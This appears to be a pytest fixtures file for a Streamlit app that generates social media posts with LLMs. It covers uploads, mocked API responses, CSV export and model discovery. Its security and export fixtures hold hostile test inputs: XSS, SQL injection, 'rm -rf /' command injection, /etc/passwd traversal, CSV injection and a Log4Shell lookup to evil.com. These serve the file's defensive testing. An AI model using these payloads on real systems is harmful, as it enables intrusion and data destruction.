import pytest
import io
from pathlib import Path
from unittest.mock import Mock, MagicMock, AsyncMock
import pandas as pd
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Optional


@pytest.fixture
def mock_uploaded_file():
    """Create a mock Streamlit UploadedFile object."""
    def _create_mock_file(content: bytes, filename: str, file_type: str = None):
        mock_file = Mock()
        mock_file.read.return_value = content
        mock_file.name = filename
        mock_file.type = file_type or f"application/{filename.split('.')[-1]}"
        mock_file.size = len(content)
        
        # Reset read position after each call
        def reset_and_read():
            return content
        mock_file.read = reset_and_read
        
        # Mock getvalue for StringIO compatibility
        mock_file.getvalue.return_value = content
        
        return mock_file
    
    return _create_mock_file


@pytest.fixture
def sample_text_content():
    """Sample text content for testing."""
    return "This is a sample text file.\nIt contains multiple lines.\nAnd some unicode: éñ中文"


@pytest.fixture
def sample_markdown_content():
    """Sample markdown content for testing."""
    return """# Sample Markdown
    
This is a **bold** text and *italic* text.

## Features
- List item 1
- List item 2

[Link example](https://example.com)
"""


@pytest.fixture
def sample_excel_data():
    """Sample Excel data as DataFrame."""
    data = {
        'Post Text': [
            'First social media post about our product',
            'Second post with engagement focus',
            'Third post about company culture'
        ],
        'Timestamp': [
            '2024-01-01 10:00:00',
            '2024-01-02 14:30:00',
            '2024-01-03 09:15:00'
        ]
    }
    return pd.DataFrame(data)


@pytest.fixture
def fixtures_path():
    """Path to test fixtures directory."""
    return Path(__file__).parent / "fixtures"


@pytest.fixture
def create_temp_file(tmp_path):
    """Helper to create temporary test files."""
    def _create_file(filename: str, content: str, encoding: str = 'utf-8'):
        file_path = tmp_path / filename
        if isinstance(content, str):
            file_path.write_text(content, encoding=encoding)
        else:
            file_path.write_bytes(content)
        return file_path
    
    return _create_file


# LLM Mocking Fixtures for Phase 3

@pytest.fixture
def mock_gemini_response():
    """Mock Gemini API response."""
    mock_response = MagicMock()
    mock_response.text = """POST 1: Exciting news! Our AI assistant just got smarter 🚀 #Innovation #AI

POST 2: Streamline your workflow with our latest integration features #ProductivityHack

POST 3: Join thousands of satisfied users who've transformed their work process 💼"""
    return mock_response


@pytest.fixture
def mock_openai_response():
    """Mock OpenAI API response."""
    mock_response = MagicMock()
    mock_response.choices = [MagicMock()]
    mock_response.choices[0].message.content = """1. Revolutionary update: Experience the future of AI-powered productivity today! ✨

2. Behind the scenes: How our engineering team built scalable AI solutions 🔧

3. Community spotlight: Amazing results from our beta users! What will you create? 🌟"""
    return mock_response


@pytest.fixture
def mock_anthropic_response():
    """Mock Anthropic API response."""
    mock_response = MagicMock()
    mock_response.content = [MagicMock()]
    mock_response.content[0].text = """Here are your social media posts:

---
🎯 Game-changing AI technology is here! Discover how our platform transforms business workflows
---
💡 Pro tip: Boost team productivity by 40% with intelligent automation features
---
🚀 Ready to join the AI revolution? Connect with thousands of forward-thinking professionals"""
    return mock_response


@pytest.fixture
def sample_prompt_components():
    """Sample components for prompt building tests."""
    return {
        "source_text": """
        Product Launch: AI-Powered Analytics Dashboard
        
        Key Features:
        - Real-time data visualization
        - Automated report generation
        - Machine learning insights
        - Custom KPI tracking
        
        Benefits:
        - 50% faster decision making
        - Reduced manual work
        - Actionable insights
        """,
        "brand_guide_text": """
        Brand Voice Guidelines:
        
        Tone: Professional yet approachable
        Style: Clear, concise, benefit-focused
        Voice: Confident and helpful
        
        Do:
        - Use active voice
        - Include statistics when relevant
        - End with clear call-to-action
        - Use emojis sparingly for engagement
        
        Don't:
        - Use technical jargon
        - Make unsubstantiated claims
        - Use all caps
        """,
        "post_history": [
            "Thrilled to announce our Q3 results! 📈 Revenue up 45% thanks to our amazing customers and team",
            "Innovation spotlight: How we're using AI to solve real business challenges. Read our latest case study 💡",
            "Customer success story: \"This platform saved us 20 hours per week!\" - Sarah, Marketing Director at TechCorp"
        ]
    }


@pytest.fixture
def mock_llm_clients():
    """Mock LLM client objects for all providers."""
    return {
        "gemini": {
            "client": MagicMock(),
            "model": MagicMock()
        },
        "openai": {
            "client": MagicMock()
        },
        "anthropic": {
            "client": MagicMock()
        }
    }


@pytest.fixture
def sample_llm_error_scenarios():
    """Sample error scenarios for LLM testing."""
    return {
        "invalid_api_key": Exception("Authentication failed: Invalid API key"),
        "rate_limit": Exception("Rate limit exceeded. Please try again later."),
        "quota_exceeded": Exception("Quota exceeded for this billing period"),
        "network_error": Exception("Network connection failed"),
        "service_unavailable": Exception("Service temporarily unavailable"),
        "malformed_response": Exception("Unable to parse API response")
    }


@pytest.fixture
def sample_post_parsing_inputs():
    """Sample inputs for post parsing tests."""
    return {
        "dash_separated": """POST 1: First amazing post with hashtags #innovation #tech
---
POST 2: Second engaging post with emojis 🚀💡
---
POST 3: Third compelling post with call-to-action""",
        
        "numbered_format": """1. Professional update about our latest milestone achievement 📊

2. Industry insights: Key trends shaping the future of business automation

3. Team spotlight: Meet the brilliant minds behind our AI technology 👥""",
        
        "post_prefix": """POST 1: Breaking: Major partnership announcement coming next week! 🤝

POST 2: Tutorial Tuesday: 5 ways to maximize your productivity with our platform 💪

POST 3: Weekend wisdom: Success is a journey, not a destination ✨""",
        
        "mixed_format": """Here are your social media posts:

1. Innovation never stops! Check out our latest feature release 🆕

---

POST 2: Community question: What's your biggest workflow challenge? 

---

3. Inspiring quote: "Technology is best when it brings people together" - Matt Mullenweg"""
    }


@pytest.fixture  
def realistic_workflow_data():
    """Realistic data for end-to-end workflow testing."""
    return {
        "source_files_content": [
            """PRESS RELEASE: TechCorp Launches Revolutionary AI Platform
            
            San Francisco, CA - TechCorp today announced the launch of its groundbreaking AI-powered 
            business intelligence platform, designed to transform how enterprises make data-driven decisions.
            
            Key Features:
            • Advanced machine learning algorithms
            • Real-time data processing
            • Intuitive dashboard interface
            • Enterprise-grade security
            
            CEO Statement: "This platform represents years of research and development. We're excited 
            to help businesses unlock the power of their data."
            
            Availability: General availability starts Q1 2024
            Pricing: Starting at $99/month for small teams
            """,
            
            """FEATURE SPECIFICATIONS:
            
            Dashboard Capabilities:
            - Custom visualization widgets
            - Drag-and-drop interface  
            - Real-time collaboration
            - Mobile responsive design
            
            AI Features:
            - Predictive analytics
            - Anomaly detection
            - Natural language queries
            - Automated insights
            
            Integration Support:
            - Salesforce, HubSpot, Slack
            - Google Workspace, Microsoft 365
            - 50+ data connectors
            - RESTful API access
            """
        ],
        
        "brand_guide": """TECHCORP BRAND GUIDELINES
        
        Brand Personality:
        - Innovative: We're at the forefront of technology
        - Trustworthy: Enterprise clients depend on us
        - Approachable: Complex tech made simple
        - Results-driven: We focus on business outcomes
        
        Voice & Tone:
        - Professional but not stuffy
        - Confident without being arrogant  
        - Helpful and educational
        - Data-driven and factual
        
        Content Guidelines:
        - Lead with benefits, not features
        - Use concrete examples and metrics
        - Include clear calls-to-action
        - Maintain consistent messaging
        
        Social Media Specifics:
        - Use 1-2 relevant emojis per post
        - Include 2-3 strategic hashtags
        - Tag relevant partners/customers (with permission)
        - Post consistently during business hours
        """,
        
        "post_history": [
            "🎉 Milestone alert: We've officially processed over 1 billion data points for our enterprise clients! Thank you to our incredible customers who trust us with their most important business decisions. #DataDriven #Enterprise #Milestone",
            
            "💡 Tuesday Tip: Did you know that companies using AI-powered analytics see 23% faster decision-making? Our latest case study breaks down exactly how. Link in comments! #BusinessIntelligence #AI #CaseStudy",
            
            "🚀 Sneak peek: Our upcoming Q1 release includes natural language querying - ask your data questions in plain English! Beta testers are loving this feature. Who's excited to try it? #ProductUpdate #AI #Innovation",
            
            "👥 Team spotlight: Meet Sarah Chen, our Lead Data Scientist! Her work on predictive algorithms has helped customers prevent $2M+ in potential losses. Amazing work, Sarah! #TeamSpotlight #DataScience #WomenInTech",
            
            "📊 Industry insight: 78% of executives say data quality is their biggest analytics challenge. Our new data validation features tackle this head-on. How does your team handle data quality? #DataQuality #Analytics #BusinessIntelligence"
        ]
    }


# Phase 5 CSV Export Testing Fixtures

@pytest.fixture
def sample_export_posts():
    """Sample posts for CSV export testing."""
    return [
        "🚀 Exciting announcement: Our AI platform just got a major upgrade! New features include real-time analytics and predictive insights. #AI #Innovation #TechUpdate",
        "💡 Pro tip: Boost your team's productivity by 40% with automated workflows. Here's how our customers are doing it: [link] #ProductivityHack #Automation",
        "🎉 Thank you to our amazing community! We've reached 50,000+ users and couldn't be more grateful. What feature should we build next? #Community #Milestone",
        "📊 Industry report: 85% of businesses struggle with data silos. Our new integration hub solves this problem. Learn more: [link] #DataIntegration #BusinessIntelligence",
        "🔥 Weekend motivation: \"Innovation distinguishes between a leader and a follower.\" - Steve Jobs. How are you innovating today? #MondayMotivation #Innovation"
    ]


@pytest.fixture
def sample_csv_export_data():
    """Sample CSV export data for testing."""
    return {
        'posts': [
            "First post with professional content for LinkedIn",
            "Second post with emojis 🚀💡 and hashtags #innovation #tech",
            "Third post with quotes \"success\" and special chars @#$%"
        ],
        'platform': "LinkedIn",
        'timestamp': "2024-01-15T10:30:45.123456"
    }


@pytest.fixture
def problematic_export_posts():
    """Posts with potential CSV export challenges."""
    return [
        'Post with "nested quotes" and \'mixed quotes\'',
        "Post with line breaks\nand multiple\nlines of\ncontent",
        "Post with CSV injection attempt: =SUM(A1:A10)",
        "Post with Unicode: 你好世界 🌍 émojis and café",
        "Post with NULL\x00characters and control\x01chars",
        "Post with extreme length: " + "A" * 2000,
        "Post, with, many, commas, and; semicolons: everywhere",
        "Post with\ttabs\tand\tspecial\twhitespace   ",
    ]


@pytest.fixture
def platform_specific_test_posts():
    """Platform-specific test posts for validation."""
    return {
        "X": [
            "Short tweet under 280 chars! 🚀 #TwitterOptimized",
            "This is a much longer tweet that exceeds the 280 character limit for Twitter and should trigger validation warnings when exporting for the X platform specifically because it's too verbose for the platform requirements",
            "Tweet with #too #many #hashtags #for #twitter #optimization #rules #here"
        ],
        "LinkedIn": [
            "Professional LinkedIn post with industry insights and thought leadership content that provides value to the professional network community. This type of content performs well on LinkedIn and engages business professionals.",
            "A" * 3500,  # Exceeds LinkedIn limit
            "LinkedIn post with appropriate professional tone and relevant hashtags #Leadership #BusinessGrowth #Innovation #ProfessionalDevelopment #CareerAdvice"
        ],
        "Instagram": [
            "Instagram post with visual storytelling ✨ Perfect for engagement! 📸 #VisualContent #Instagram #Photography #Creative #Aesthetic #InstaGood #PhotoOfTheDay #Beautiful #Amazing #Life",
            "Simple Instagram caption",
            "A" * 2500  # Exceeds Instagram limit
        ],
        "Facebook": [
            "Facebook post with community focus and longer form content that tells a story and encourages meaningful discussion among friends and family members",
            "Short Facebook update",
            "Facebook post with moderate hashtag usage #Community #Family #Friends"
        ]
    }


@pytest.fixture
def mock_csv_export_function():
    """Mock CSV export function for testing UI components."""
    def _mock_export(posts, platform, include_metadata=False):
        # Create mock DataFrame
        data = {
            'post_text': posts,
            'generation_timestamp': ['2024-01-15T10:30:00'] * len(posts)
        }
        
        if include_metadata:
            data.update({
                'platform': [platform] * len(posts),
                'post_number': list(range(1, len(posts) + 1)),
                'character_count': [len(post) for post in posts]
            })
        
        df = pd.DataFrame(data)
        csv_string = df.to_csv(index=False)
        filename = f"posts_for_{platform}_2024-01-15T10:30:00.csv"
        
        return csv_string, filename
    
    return _mock_export


@pytest.fixture
def export_validation_scenarios():
    """Various export validation test scenarios."""
    return {
        "valid_scenario": {
            "posts": ["Valid post 1", "Valid post 2", "Valid post 3"],
            "platform": "LinkedIn",
            "expected_valid": True,
            "expected_issues": []
        },
        "empty_posts_scenario": {
            "posts": ["", "   ", "\n\n", "\t\t"],
            "platform": "X", 
            "expected_valid": False,
            "expected_issues": ["All posts are empty"]
        },
        "mixed_content_scenario": {
            "posts": ["Valid post", "", "Another valid post", "   "],
            "platform": "LinkedIn",
            "expected_valid": True,
            "expected_issues": ["Some posts are empty"]
        },
        "platform_violation_scenario": {
            "posts": ["A" * 400],  # Too long for X
            "platform": "X",
            "expected_valid": False,
            "expected_issues": ["Exceeds character limit"]
        },
        "csv_injection_scenario": {
            "posts": ["=SUM(A1:A10)", "+cmd|calc", "Normal post"],
            "platform": "LinkedIn",
            "expected_valid": False,
            "expected_issues": ["Potential CSV injection"]
        }
    }


@pytest.fixture
def large_dataset_posts():
    """Large dataset for performance testing."""
    return [f"Post number {i} with substantial content for testing large export scenarios. This post contains enough text to simulate realistic social media content with multiple sentences and engaging elements." for i in range(1000)]


@pytest.fixture
def unicode_test_posts():
    """Posts with various Unicode characters for encoding tests."""
    return [
        "Post with Chinese: 你好世界",
        "Post with Arabic: مرحبا بالعالم",
        "Post with Russian: Привет мир", 
        "Post with French accents: Café résumé naïve",
        "Post with emojis: 🚀💡🎉🌟✨🔥💪🎯",
        "Post with math symbols: α β γ δ ∑ ∏ ∆ Ω",
        "Post with currency: $ € £ ¥ ₹ ₿",
        "Post with special chars: ©™®°±×÷≠≤≥∞"
    ]


# Phase 6 Testing Fixtures

@pytest.fixture
def mock_user_experience_components():
    """Mock Streamlit components for UX testing."""
    return {
        'spinner': MagicMock(),
        'success': MagicMock(),
        'error': MagicMock(),
        'warning': MagicMock(),
        'info': MagicMock(),
        'progress': MagicMock(),
        'text_input': MagicMock(),
        'selectbox': MagicMock(),
        'file_uploader': MagicMock(),
        'button': MagicMock(),
        'metric': MagicMock(),
        'columns': MagicMock()
    }


@pytest.fixture
def sample_user_feedback_scenarios():
    """Sample scenarios for user feedback testing."""
    return {
        'success_scenarios': [
            ("post_generation", "🎉 Successfully generated 5 posts for LinkedIn!"),
            ("file_upload", "✅ Files uploaded and processed successfully!"),
            ("csv_export", "📄 CSV export completed successfully!"),
            ("validation_passed", "🔍 All inputs validated successfully!")
        ],
        'error_scenarios': [
            ("missing_api_key", "🔑 Please enter your API key"),
            ("invalid_file", "📁 Invalid file format. Please upload .txt, .docx, .pdf, or .md files"),
            ("api_failure", "❌ API request failed. Please check your API key and try again"),
            ("generation_error", "💥 Post generation failed. Please try again with different settings")
        ],
        'warning_scenarios': [
            ("char_limit", "⚠️ Post exceeds platform character limit"),
            ("large_file", "🚨 Large file detected - processing may take longer"),
            ("rate_limit", "⏰ API rate limit approached - please wait before next request"),
            ("empty_content", "📝 Some content areas are empty")
        ],
        'info_scenarios': [
            ("workflow_tip", "💡 Tip: Upload a brand guide for better post consistency"),
            ("platform_info", "📊 LinkedIn posts perform best with professional tone"),
            ("export_ready", "📋 Ready to export 5 validated posts"),
            ("processing_info", "🔄 Processing files in background...")
        ]
    }


@pytest.fixture
def input_validation_test_cases():
    """Test cases for input validation."""
    return {
        'api_keys': {
            'valid': [
                "sk-1234567890abcdef1234567890abcdef",
                "sk-ant-api03-1234567890abcdef",
                "AIzaSy1234567890abcdef1234567890"
            ],
            'invalid': [
                "",
                "invalid",
                "sk-",
                "test123",
                "api_key_here"
            ]
        },
        'file_formats': {
            'valid': [
                "document.txt",
                "report.pdf", 
                "guide.docx",
                "notes.md",
                "history.xlsx"
            ],
            'invalid': [
                "image.jpg",
                "script.py",
                "malware.exe",
                "data.csv",
                "archive.zip"
            ]
        },
        'post_counts': {
            'valid': [1, 5, 10, 25, 50],
            'invalid': [0, -1, 51, 100, 1000]
        },
        'platforms': {
            'valid': ["X", "LinkedIn", "Facebook", "Instagram"],
            'invalid': ["Twitter", "TikTok", "YouTube", "Pinterest", "InvalidPlatform"]
        }
    }


@pytest.fixture
def code_quality_test_files():
    """Sample code files for quality testing."""
    return {
        'good_code': '''
def process_data(data: List[str]) -> Tuple[bool, str]:
    """
    Process input data with validation.
    
    Args:
        data: List of strings to process
        
    Returns:
        Tuple of (success, message)
    """
    try:
        if not data:
            return False, "No data provided"
            
        processed = []
        for item in data:
            if isinstance(item, str) and item.strip():
                processed.append(item.strip())
                
        return True, f"Processed {len(processed)} items"
        
    except Exception as e:
        logger.error(f"Processing failed: {e}")
        return False, f"Error: {str(e)}"
''',
        'poor_code': '''
def process(x):
    print("DEBUG: processing", x)  # TODO: remove this
    result = []
    for i in x:
        try:
            result.append(i.strip())
        except:
            pass
    return result
''',
        'config_file': '''
LLM_PROVIDERS = ["OpenAI", "Google Gemini", "Anthropic"]
TARGET_PLATFORMS = ["X", "LinkedIn", "Facebook", "Instagram"]
SUPPORTED_TEXT_FORMATS = [".txt", ".docx", ".pdf", ".md"]
MAX_FILE_SIZE_MB = 10
'''
    }


@pytest.fixture
def security_test_cases():
    """Security test cases for validation."""
    return {
        'malicious_inputs': [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "$(rm -rf /)",
            "../../../etc/passwd",
            "{{7*7}}",
            "=SUM(1+1)*cmd|calc",
            "${jndi:ldap://evil.com}"
        ],
        'safe_inputs': [
            "Normal text content",
            "Brand guide with instructions",
            "Social media post with hashtags #marketing",
            "Product description with features"
        ],
        'file_security': {
            'safe_files': [
                ("document.txt", "text/plain", 1024),
                ("report.pdf", "application/pdf", 1024*1024),
                ("guide.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 512*1024)
            ],
            'unsafe_files': [
                ("malware.exe", "application/x-executable", 1024),
                ("script.js", "application/javascript", 1024),
                ("large_file.txt", "text/plain", 100*1024*1024)
            ]
        }
    }


@pytest.fixture
def performance_test_data():
    """Data for performance testing."""
    return {
        'large_text': "This is a sample line of text for performance testing.\n" * 10000,
        'many_files': [
            f"File {i} content with substantial text for performance testing" * 100 
            for i in range(50)
        ],
        'complex_processing': {
            'input_size': 1000,
            'expected_time_limit': 5.0,  # seconds
            'memory_limit_mb': 100
        }
    }


@pytest.fixture
def deployment_test_configs():
    """Configuration scenarios for deployment testing."""
    return {
        'production_config': {
            'debug': False,
            'log_level': 'INFO',
            'session_timeout': 3600,
            'max_file_size': 10 * 1024 * 1024,
            'rate_limiting': True,
            'security_headers': {
                'X-Frame-Options': 'DENY',
                'X-Content-Type-Options': 'nosniff',
                'X-XSS-Protection': '1; mode=block'
            }
        },
        'development_config': {
            'debug': True,
            'log_level': 'DEBUG',
            'session_timeout': 1800,
            'max_file_size': 5 * 1024 * 1024,
            'rate_limiting': False
        },
        'requirements_content': '''
streamlit==1.29.0
pandas==2.1.4
python-docx==1.1.0
PyMuPDF==1.23.14
openpyxl==3.1.2
google-generativeai==0.3.2
openai==1.3.7
anthropic==0.7.7
''',
        'invalid_requirements': '''
streamlit
pandas
python-docx>=1.0
'''
    }


@pytest.fixture
def documentation_test_content():
    """Sample documentation content for testing."""
    return {
        'good_readme': '''
# Auto Post Generator

## Description
AI-powered social media post generator for businesses.

## Installation
1. Create virtual environment: `python -m venv venv`
2. Activate environment: `source venv/bin/activate`
3. Install dependencies: `pip install -r requirements.txt`

## Usage
```bash
streamlit run app.py
```

## Requirements
- Python 3.8+
- API keys for LLM providers

## Configuration
Set environment variables for API keys.
''',
        'poor_readme': '''
# App

This is an app.

Run it.
''',
        'good_docstring': '''
        Create CSV export of generated posts.
        
        Args:
            posts: List of final edited posts
            platform: Target platform name
            include_metadata: Whether to include additional metadata
            
        Returns:
            tuple[str, str]: (csv_string, filename)
            
        Raises:
            ValueError: If posts list is empty
            
        Example:
            >>> posts = ["Post 1", "Post 2"]
            >>> csv_data, filename = create_csv_export(posts, "LinkedIn")
        ''',
        'poor_docstring': 'Does stuff with posts.'
    }


# Phase 9 Testing Fixtures for Dynamic Model Selection

@pytest.fixture
def phase9_provider_model_endpoints():
    """Phase 9 provider model endpoints configuration."""
    return {
        "openai": {
            "base_url": "https://api.openai.com/v1",
            "models_endpoint": "/models",
            "auth_method": "bearer_token",
            "rate_limit": 60,
            "timeout": 30,
            "discovery_method": "api_endpoint"
        },
        "anthropic": {
            "base_url": "https://api.anthropic.com/v1",
            "models_endpoint": None,  # Uses trial-and-error approach
            "auth_method": "x_api_key", 
            "rate_limit": 50,
            "timeout": 30,
            "discovery_method": "trial_and_error"
        },
        "google": {
            "base_url": "https://generativelanguage.googleapis.com/v1",
            "models_endpoint": "/models",
            "auth_method": "api_key",
            "rate_limit": 60,
            "timeout": 30,
            "discovery_method": "api_endpoint"
        }
    }


@pytest.fixture
def phase9_model_capabilities():
    """Phase 9 model capabilities for testing."""
    return {
        "gpt-4o": {
            "provider": "openai",
            "max_tokens": 4096,
            "context_window": 128000,
            "supports_functions": True,
            "supports_vision": True,
            "supports_json_mode": True,
            "temperature_range": [0.0, 2.0],
            "top_p_range": [0.0, 1.0],
            "pricing": {
                "input_per_1k": 0.005,
                "output_per_1k": 0.015
            },
            "deprecated": False,
            "version": "2024-05-13"
        },
        "claude-3-5-sonnet-20241022": {
            "provider": "anthropic",
            "max_tokens": 8192,
            "context_window": 200000,
            "supports_functions": True,
            "supports_vision": True,
            "supports_json_mode": False,
            "temperature_range": [0.0, 1.0],
            "top_p_range": [0.0, 1.0],
            "pricing": {
                "input_per_1k": 0.003,
                "output_per_1k": 0.015
            },
            "deprecated": False,
            "version": "2024-10-22"
        },
        "gemini-1.5-pro": {
            "provider": "google",
            "max_tokens": 8192,
            "context_window": 1048576,
            "supports_functions": True,
            "supports_vision": True,
            "supports_json_mode": True,
            "temperature_range": [0.0, 2.0],
            "top_p_range": [0.0, 1.0],
            "pricing": {
                "input_per_1k": 0.00125,
                "output_per_1k": 0.005
            },
            "deprecated": False,
            "version": "001"
        }
    }


@pytest.fixture
def phase9_available_models():
    """Phase 9 available models data for UI testing."""
    return {
        'openai': [
            {'id': 'gpt-4o', 'name': 'GPT-4 Optimized', 'description': 'Latest GPT-4 model'},
            {'id': 'gpt-4o-mini', 'name': 'GPT-4 Mini', 'description': 'Smaller, faster GPT-4'},
            {'id': 'gpt-3.5-turbo', 'name': 'GPT-3.5 Turbo', 'description': 'Fast and capable'}
        ],
        'anthropic': [
            {'id': 'claude-3-5-sonnet-20241022', 'name': 'Claude 3.5 Sonnet', 'description': 'Most capable Claude model'},
            {'id': 'claude-3-haiku-20240307', 'name': 'Claude 3 Haiku', 'description': 'Fast and efficient'}
        ],
        'google': [
            {'id': 'gemini-1.5-pro', 'name': 'Gemini 1.5 Pro', 'description': 'Most capable multimodal model'},
            {'id': 'gemini-1.5-flash', 'name': 'Gemini 1.5 Flash', 'description': 'Fast and versatile'}
        ]
    }


@pytest.fixture
def phase9_dynamic_model_parameters():
    """Phase 9 dynamic model parameters for testing."""
    return {
        'gpt-4o': {
            'temperature': 0.7,
            'max_tokens': 4096,
            'top_p': 1.0,
            'frequency_penalty': 0.0,
            'presence_penalty': 0.0,
            'response_format': {'type': 'text'}
        },
        'claude-3-5-sonnet-20241022': {
            'temperature': 0.7,
            'max_tokens': 8192,
            'top_p': 1.0,
            'stop_sequences': []
        },
        'gemini-1.5-pro': {
            'temperature': 0.7,
            'maxOutputTokens': 8192,
            'topP': 1.0,
            'topK': 40
        }
    }


@pytest.fixture
def phase9_mock_model_discovery_service():
    """Phase 9 mock model discovery service."""
    service = Mock()
    service.fetch_available_models = AsyncMock()
    service.cache_models = Mock()
    service.get_cached_models = Mock()
    service.discover_model_capabilities = AsyncMock()
    service.invalidate_cache = Mock()
    return service


@pytest.fixture
def phase9_mock_api_responses():
    """Phase 9 mock API responses for different providers."""
    return {
        'openai_models': {
            "object": "list",
            "data": [
                {
                    "id": "gpt-4o",
                    "object": "model",
                    "created": 1686935002,
                    "owned_by": "openai",
                    "permission": [],
                    "root": "gpt-4o",
                    "parent": None
                },
                {
                    "id": "gpt-4o-mini",
                    "object": "model", 
                    "created": 1686935002,
                    "owned_by": "openai",
                    "permission": [],
                    "root": "gpt-4o-mini",
                    "parent": None
                }
            ]
        },
        'gemini_models': {
            "models": [
                {
                    "name": "models/gemini-1.5-pro",
                    "displayName": "Gemini 1.5 Pro",
                    "description": "Most capable multimodal model",
                    "version": "001",
                    "inputTokenLimit": 1048576,
                    "outputTokenLimit": 8192,
                    "supportedGenerationMethods": ["generateContent", "countTokens"]
                }
            ]
        },
        'anthropic_models': [
            {
                "id": "claude-3-5-sonnet-20241022",
                "name": "Claude 3.5 Sonnet",
                "max_tokens": 8192,
                "context_window": 200000
            }
        ]
    }


@pytest.fixture
def phase9_cached_models():
    """Phase 9 sample cached models data."""
    return {
        "openai": {
            "models": ["gpt-4o", "gpt-4o-mini", "gpt-3.5-turbo"],
            "cached_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=1)).isoformat()
        },
        "anthropic": {
            "models": ["claude-3-5-sonnet-20241022", "claude-3-haiku-20240307"],
            "cached_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=1)).isoformat()
        },
        "google": {
            "models": ["gemini-1.5-pro", "gemini-1.5-flash"],
            "cached_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=1)).isoformat()
        }
    }


@pytest.fixture
def phase9_parameter_templates():
    """Phase 9 model parameter templates."""
    return {
        "default": {
            "temperature": 0.7,
            "max_tokens": 4096,
            "top_p": 1.0,
            "frequency_penalty": 0.0,
            "presence_penalty": 0.0
        },
        "creative": {
            "temperature": 1.2,
            "max_tokens": 4096,
            "top_p": 0.9,
            "frequency_penalty": 0.1,
            "presence_penalty": 0.1
        },
        "precise": {
            "temperature": 0.2,
            "max_tokens": 4096,
            "top_p": 0.8,
            "frequency_penalty": 0.0,
            "presence_penalty": 0.0
        }
    }


@pytest.fixture
def phase9_fallback_models():
    """Phase 9 fallback model lists."""
    return {
        "openai": ["gpt-4o", "gpt-4o-mini", "gpt-3.5-turbo"],
        "anthropic": ["claude-3-5-sonnet-20241022", "claude-3-haiku-20240307"],
        "google": ["gemini-1.5-pro", "gemini-1.5-flash", "gemini-pro"]
    }


@pytest.fixture 
def phase9_provider_model_mapping():
    """Phase 9 mapping of providers to their supported models."""
    return {
        'openai': [
            'gpt-4o', 'gpt-4o-mini', 'gpt-4-turbo', 'gpt-4', 'gpt-3.5-turbo'
        ],
        'anthropic': [
            'claude-3-5-sonnet-20241022', 'claude-3-opus-20240229', 
            'claude-3-sonnet-20240229', 'claude-3-haiku-20240307'
        ],
        'google': [
            'gemini-1.5-pro', 'gemini-1.5-flash', 'gemini-pro', 'gemini-pro-vision'
        ]
    }


@pytest.fixture
def phase9_ui_state_transitions():
    """Phase 9 UI state transitions for testing."""
    return [
        {'from': 'initial', 'to': 'provider_selected', 'trigger': 'provider_change'},
        {'from': 'provider_selected', 'to': 'api_key_entered', 'trigger': 'api_key_input'},
        {'from': 'api_key_entered', 'to': 'models_loading', 'trigger': 'model_fetch_start'},
        {'from': 'models_loading', 'to': 'models_loaded', 'trigger': 'model_fetch_success'},
        {'from': 'models_loaded', 'to': 'model_selected', 'trigger': 'model_selection'},
        {'from': 'model_selected', 'to': 'ready_for_generation', 'trigger': 'workflow_continue'}
    ]


@pytest.fixture
def phase9_error_scenarios():
    """Phase 9 error scenarios for testing."""
    return {
        'api_unavailable': Exception("Unable to fetch models: API unavailable"),
        'invalid_api_key': Exception("Invalid API key: Cannot fetch available models"),
        'network_error': Exception("Network error: Connection timeout"),
        'rate_limit_exceeded': Exception("Rate limit exceeded: Too many requests"),
        'malformed_response': Exception("Malformed API response"),
        'unsupported_model': Exception("Model not supported by provider"),
        'parameter_out_of_range': Exception("Parameter value out of valid range"),
        'model_not_found': Exception("Specified model not found")
    }